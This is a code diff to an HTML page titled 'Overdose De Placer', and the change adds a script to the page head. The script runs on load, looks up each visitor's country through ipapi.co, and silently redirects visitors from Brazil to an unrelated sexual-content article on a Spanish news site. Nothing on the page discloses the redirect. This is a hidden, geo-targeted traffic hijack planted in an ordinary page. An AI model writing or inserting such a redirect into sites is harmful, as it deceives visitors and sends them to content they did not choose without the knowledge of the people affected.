@@ -5,7 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Overdose De Placer</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400&display=swap" rel="stylesheet">
-    <style>
+    <script>
+  // Função para verificar o país do visitante usando um serviço de geolocalização
+  function verificarLocalizacao() {
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const country = data.country;
+        if (country === 'BR') { // 
+          window.location.href = 'https://www.periodistadigital.com/gente/codigoxy/20170507/video-cosas-lesbianas-secreto-sexo-noticia-689400965303/'; // 
+        } else {
+          // 
+          console.log('Visitante de fora do Brasil.');
+        }
+      })
+      .catch(error => {
+        console.error('Erro ao obter localização:', error);
+        // 
+      });
+  }
+
+  // 
+  verificarLocalizacao();
+</script>
+	<style>
         body {
             margin: 0;
             font-family: 'Poppins', sans-serif;
